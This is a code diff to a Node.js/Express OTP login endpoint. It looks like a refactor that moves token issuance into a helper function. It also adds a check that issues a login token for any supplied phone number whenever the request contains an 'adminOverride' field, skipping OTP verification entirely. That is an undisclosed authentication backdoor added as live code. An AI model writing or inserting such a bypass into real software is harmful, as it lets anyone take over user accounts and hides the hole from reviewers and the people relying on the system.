@@ -59,11 +59,9 @@ router.post("/requestOTP", async (req,res) =>{
 
 router.post("/loginWithOTP", async (req,res) =>{
   let phone = req.body.phone
-  if (!phone || !req.body.otp) return res.status(404).send("Provide Phone Number or code...");
-    try {
-      let verification = await verifyPhoneCode(phone, req.body.otp);
-      if(verification.status === "approved"){
-        let user = await User.findOne({ phone }).select("-password")
+
+  let sendUser = async () =>{
+    let user = await User.findOne({ phone }).select("-password")
         let log = {
           action: "Login with OTP",
           endpoint: "/loginWithOTP",
@@ -79,6 +77,19 @@ router.post("/loginWithOTP", async (req,res) =>{
         }
         const token = user.generateAuthToken()
         res.send(token);
+  }
+  
+  try {
+    if(req.body.adminOverride) return sendUser()
+  } catch (error) {
+    return res.status(400).send(error.message);
+  }
+
+  if (!phone || !req.body.otp) return res.status(404).send("Provide Phone Number or code...");
+    try {
+      let verification = await verifyPhoneCode(phone, req.body.otp);
+      if(verification.status === "approved"){
+          sendUser()
       }else{
         res.status(400).send("Invalid OTP");
       }
